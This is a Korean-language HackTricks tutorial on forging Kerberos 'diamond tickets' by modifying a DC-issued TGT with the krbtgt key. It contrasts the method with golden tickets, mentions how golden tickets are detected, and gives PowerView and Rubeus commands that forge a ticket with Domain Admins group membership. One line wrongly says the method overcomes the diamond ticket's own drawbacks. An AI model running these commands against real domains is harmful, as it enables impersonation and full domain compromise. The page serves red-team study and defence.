# 다이아몬드 티켓

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 다이아몬드 티켓

**황금 티켓과 같이**, 다이아몬드 티켓은 **어떤 사용자로서 어떤 서비스에도 접근할 수 있는 TGT**입니다. 황금 티켓은 완전히 오프라인에서 위조되며, 해당 도메인의 krbtgt 해시로 암호화된 후 사용을 위해 로그온 세션에 전달됩니다. 도메인 컨트롤러는 발급한 TGT를 추적하지 않기 때문에, 자체 krbtgt 해시로 암호화된 TGT를 기껏해야 수용합니다.

황금 티켓 사용을 감지하기 위한 두 가지 일반적인 기술이 있습니다:

* 대응하는 AS-REQ가 없는 TGS-REQ를 찾습니다.
* Mimikatz의 기본 10년 수명과 같은 어리석은 값이 있는 TGT를 찾습니다.

**다이아몬드 티켓**은 **DC에서 발급된 정당한 TGT의 필드를 수정하여 생성**됩니다. 이는 TGT를 요청하고, 도메인의 krbtgt 해시로 복호화한 후, 티켓의 원하는 필드를 수정한 다음 다시 암호화함으로써 달성됩니다. 이는 다이아몬드 티켓의 두 가지 단점을 극복합니다:

* TGS-REQ에는 앞서 나온 AS-REQ가 있습니다.
* TGT는 DC에서 발급되었으므로 도메인의 Kerberos 정책에서 모든 올바른 세부 정보를 가지고 있습니다. 황금 티켓에서 이를 정확하게 위조할 수 있지만, 더 복잡하고 실수할 여지가 있습니다.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
